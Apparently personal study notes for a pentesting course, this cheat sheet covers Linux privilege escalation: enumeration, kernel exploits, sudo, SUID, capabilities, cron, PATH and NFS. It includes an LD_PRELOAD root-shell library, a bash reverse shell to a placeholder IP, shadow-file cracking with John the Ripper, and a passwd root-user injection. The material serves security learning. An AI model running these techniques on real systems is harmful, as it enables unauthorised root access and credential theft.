
# Linux Privilege Escalation

 - By Rohit Pandey
 - In order to understand what a particular Linux command does, use: https://www.explainshell.com/
 - Important Resource: https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/
 - Privilege Escalation usually involves going from a lower permission account to a higher permission one.
 - Once we obtain the higher level privilege on the system then we can do a lot of things on that system
 




## Enumeration :

 - Here we're going to see few commands which help us in enumerating target system
    1. `hostname`- lists the name of the host
    2. `uname -a`- print out kernel used by the system
    3. `cat /proc/version`- may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
    4. `cat /etc/issue`- This file usually contains some information about the operating system but can easily be customized or changes. 
    5. `ps`- Typing ps on your terminal will show processes for the current shell
        * `ps -A`- View all running processes
        * `ps axjf`- View process tree
        * `ps aux`- The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x).
    6. `env`- will show environmental variables
    7. `sudo -l`- list all commands your user can run using sudo
    8. `ls -l`- list all the file and directorys
        * `ls -la`- with la it will not ignore entries starting with .
    9. `groups`- lists the groups that current user is in 
    10. `id`- lists id of group, user
        * `id frank`-  same inf. for another user
    11. `cat /etc/passwd`- display all users
        * `cat /etc/passwd | cut -d ":" -f 1`- removes other stuff & only displays users
        * `cat /etc/passwd | grep home`- real users will most likely have their folders under the "home" directory
    12. `history`- previously ran commands which might have some sensitive information
    13. `ifconfig` or `ip a` or `ip route`- network related information
    14. `netstat`- network route 
        * `netstat -a`- shows all listening ports and established connections
        * `netstat -at` or `netstat -au`- list all TCP AND UDP protocols respectively
        * `netstat -l`- list ports in "listening" mode.
        * `netstat -lt`- list ports in "listening" mode and only TCP protocols
        * `netstat -s`- list network usage statistics by protocol & can also be used with the -t and -u options to limit the output to the specific protocol
        * `netsat -tp`- connections with service name and pid we can also add "l" for only listening ports
        * `netstat -i`- interface related information 
        * `netstat -ano`-  -a: Display all sockets, -n: Do not resolve names, -o: Display timers
    15. find Command is useful and worth keeping in your arsenal.
        - Syntax : `find  <directory> <options> <expression>`
        - `find . -name flag1.txt`- find the file named "flag1.txt" in the current directory
        - `find /home -name flag1.txt`- find the file names "flag1.txt" in the /home directory
        - `find / -type d -name config`- find the directory named config under "/"
        - `find / -type f -perm 0777`- find files with the 777 permissions (files readable, writable, and executable by all users)
        - `find / -perm a=x`- find executable files
        - `find /home -user frank`- find all files for user "frank" under "/home"
        - `find / -mtime 10`- find files that were modified in the last 10 displays
        - `find / -atime 10`- find files that were accessed in the last 10 displays
        - `find / -cmin -60`- find files changed within the last hour (60 minutes)
        - `find / -amin -60`- find files accesses within the last hour (60 minutes)
        - `find / -size 50M`- find files with a 50 MB size
        This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.
        - `find / -size +100M`- file that are larger than 100 MB
        Sometimes "find" command tends to generate errors which sometimes makes the output hard to read.To solve this problem we used "-type f 2>/dev/null"
        - `find / -size +100M -type f 2>/dev/null`
        - `find / -writable -type d 2>/dev/null`- find world-writeable folders
        - `find / -perm -222 -type d 2>/dev/null`- find world-writable folders
        - `find / -perm -o w -type d 2>/dev/null`- find world-writeable folders
        - `find / -perm -o x -type d 2>/dev/null`- find world-exectable folders
        - Find development tools and supported languages:
            * `find / -name perl*`
            * `find / -name python*`
            * `find / -name gcc*`
        - Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
            * `find / -perm -u=s -type f 2>/dev/null`
        - General Linus Commands:
            * `find` , `locate` , `grep` , `cut` , `sort` , etc.
             


## AUTOMATED ENUMERATION TOOLS

Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors.
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

## Linux kernel Exploits

- After finding the version of Kernel simple google for that exploit or you can also use "Linux Exploit suggester"
The Kernel exploit methodology is simple;
    1. Identify the kernel version
    2. Search and find an exploit code for the kernel version of the target system
    3. Run the exploit
Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.
- Research sources:
    1. Based on your findings, you can use Google to search for an existing exploit code.
    2. sources such as https://www.linuxkernelcves.com/cves can also be useful.
    3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
Hints/Notes:
- Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
- You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.
- `python -m SimpleHTTPServer` or `python3 -m http.server`

## Privilege Escalation: Sudo

- This one of the first step to do, when you get access to the machine just simpley run `"sudo -l"`, which lists all the files that we can run as root without any password
- https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.
- Leverage Application Functions:
    * `Apache2` has an option that supports loading alternative configuration files (`-f`: specify an alterate ServerConfigFile).
    *  Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file
- Leverage LD_PRELOAD:
    * On some systems, you may see the LD_PRELOAD environment option. When we type `sudo -l`.
    * `env_keep+=LD_PRELOAD`
    * LD_PRELOAD is a function that allows any program to use shared libraries.
    * If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run.
    * Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
 The steps of this privilege escalation vector can be summarized as follows;
    1. Check for LD_PRELOAD (with the env_keep option)
    2. Write a simple C code compiled as a share object (.so extension) file
    3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
 The C code will simply spawn a root shell and can be written as follows;
 ```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
- `gcc -fPIC -shared -o shell.so shell.c -nostartfiles` 
We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.
- `sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`
This will result in a shell spawn with root privileges.

## Privilege Escalation: SUID

- `find / -type f -perm -04000 -ls 2>/dev/null` will list flies that have SUID or SGID bits set.
- compare executables on the list with GTFOBins (https://gtfobins.github.io) or link for a pre-filtered list (https://gtfobins.github.io/#+suid).
- The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root
1. reading `/etc/shadow` file and `/etc/passwd` file:
    - We can now use the unshadow tool to create a file crackable by John the Ripper.
    - `unshadow passwd.txt shadow.txt > passwords.txt`
    - `john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt`
    - With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext.
2. add a new user that has root privileges in `/etc/passwd` file
    - `openssl passwd -1 -salt THM password1` creating a new md5 hash password.
    - `hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash` add to the passwd file.

## Privilege Escalation: Capabilities

- `getcap -r / 2>/dev/null` tool to list enabled Capabilities.
- Please note that neither vim or its copy has the SUID bit set.
- GTFObins has a good list of binaries that can be leveraged for PE if we find any set capabilites.

## Privilege Escalation: Cron Jobs

- Cron jobs are used to run scripts or binaries at specific times.
- By default, they run with the privilege of their owners and not the current user.
- `cat /etc/crontab` any user can read the keeping system-wide cron jobs.
- You can create the cron job script if the privilege user deleted the script/Binary file but not remove the entry from the cron table.
- You can create any reverse shell script/binary file to run insted of actual deleated script/program/binary file by the privileged user.
- `touch backup.sh`
```bash
#!/bin/bash

bash -i >& /dev/tcp/<IP addr.>/6666 0>&1 2>&1
```
- `nc -nlvp 6666`

## Privilege Escalation: PATH

- PATH is an environment variable
- In order to run any binary we need to specify the full path also, but if the address of file is specified in PATH variable then we can simpley run the binary by mentioning its name, like how we run some command line tools like ls, cd,....etc
- In order to view the content in PATH variable we need to run `echo $PATH` and the outpur will be something like this `usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin`
- We can even add new path to PATH variable by `export PATH=<new-path>:$PATH`
- Also we need to find a writable paths so run `find / -writable 2>/dev/null`
- or `find / -writable 2>/dev/null |grep usr | cut -d "/" -f 2,3 | sort -u` or `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
- And also we can use to find SUID file for PE: path `find / -perm -u=s -type f 2>/dev/null`
- In the example I found a location where there's a script when I run its showing that "thm" not found, also it can be run as ROOT
- So I created a binary like `echo "/bin/bash" > thm` and gave executable rights then later added the path where thm located to PATH variable and now when I ran the binary then I got root!

## Privilege Escalation: NFS 

- In order to view the configuration of NFS run `cat /etc/exports` or also we can type `showmount -e <target IP>` on our machine to find the mountable shares.
- In the output look for directories having `no_root_squash`, this means that the particular share is writable, hence we can do something to acquires root!
- Now after getting some directories where we can play around lets navigate to our attacker machine and create a sample directory anywhere like /tmp...etc
- Now we need to mount to the target machine by, `mount -o rw <targetIP>:<share-location> <directory path we created>`, here rw means read, write privileges.
- Now go to the folder we created and create a binary which gives us root on running.
```C
 int main()
 { setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
 }   
```
- `gcc nfs.c -o nfs -w`
- `chmod +s nfs`
- Then go back to the target machine and we can view the binary we created in the place we mounted, now run that and get root privileges!(do note that giving executable rights is not sufficient, we also need to give share rights by `chmod +s <binary>`).
- Then we're good to go!
